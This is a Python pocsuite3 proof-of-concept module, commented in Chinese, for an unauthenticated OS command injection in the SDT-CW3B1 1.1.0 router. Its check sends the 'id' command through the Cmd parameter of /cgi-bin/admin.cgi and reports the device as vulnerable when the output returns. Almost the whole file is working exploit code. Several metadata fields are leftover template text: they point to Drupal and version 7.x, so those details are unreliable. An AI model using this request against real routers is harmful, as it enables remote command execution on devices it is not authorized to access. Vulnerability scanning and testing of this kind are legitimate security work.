from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)

class cveluyou(POCBase):
    vulID = "0"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "feier"  # PoC作者的大名
    vulDate = "2022-10-15"  # 漏洞公开的时间,不知道就写今天
    createDate = "2022-10-16"  # 编写 PoC 的日期
    updateDate = "2022-10-16"  # PoC 更新的时间,默认和编写时间一样
    references = ["https://xxx.xx.com.cn"]  # 漏洞地址来源,0day不用写
    name = "韩国路由PoC"  # PoC 名称
    appPowerLink = "https://www.drupal.org/"  # 漏洞厂商主页地址
    appName = "SDT-CW3B1 1.1.0 - OS Command Injection"  # 漏洞应用名称
    appVersion = "7.x"  # 漏洞影响版本
    vulType = VUL_TYPE.UNAUTHORIZED_ACCESS  # 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = []  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """
              韩国路由器存在rce漏洞
           """  # 漏洞简要描述
    pocDesc = """
               poc的用法描述
           """  # POC用法描述

    def _check(self):
        # 漏洞验证代码
        headers = {"Upgrade-Insecure-Requests": "1",
                         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
                         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                         "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,ja;q=0.8",
                         "Connection": "close"}
        result = []
        try:
            url = self.url.strip() + "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id"
            response = requests.get(url=url, headers=headers, allow_redirects=False, verify=False, timeout=9)
            # 判断是否存在漏洞
            if response.status_code == 200 and "CmdResult" in response.text:
                result.append(url)

        except Exception as e:
            pass
        finally:
            return result

    def _verify(self):
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.pocDesc
        return self.parse_verify(result)

    def _attack(self):
        return self._verify()

    def parse_verify(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output


def other_fuc():
    pass


def other_utils_func():
    pass


# 注册 DemoPOC 类
register_poc(cveluyou)